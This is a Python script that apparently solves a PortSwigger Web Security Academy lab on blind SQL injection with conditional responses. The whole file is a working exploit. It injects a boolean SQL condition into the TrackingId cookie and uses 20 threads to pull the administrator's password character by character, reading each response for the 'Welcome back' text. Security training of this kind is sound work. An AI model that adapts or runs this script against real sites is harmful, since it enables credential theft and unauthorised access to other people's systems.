# LAB: Blind SQL injection with conditional responses

import requests
from threading import Thread
import time

start_time = time.time()

# URL LAB ID
url = 'https://0a0100ee03b84680810eac5100f60088.web-security-academy.net'

# Real TrackingId
tracking_id = 'Wi6W1oFl3jcg1sZh'

threads = []
admin_pass = [''] * 20

def find_character(i):
    for ascii_value in range(32,127):
        response = requests.get(url, cookies={"TrackingId" : f"{tracking_id}' and ascii(substr((select password from users where username='administrator'),{i+1},1)) = {ascii_value} -- "})
        if 'Welcome back' in response.text:
            admin_pass[i] = chr(ascii_value)
            return

for i in range(20):
    threads.append(Thread(target=find_character, args=(i,)))
    threads[i].start()

for i in range(20):
    threads[i].join()

print(f"Administrator password: {''.join(admin_pass)}")
print('------------------------------------------- \nExecution Time: %s seconds' % (time.time() - start_time))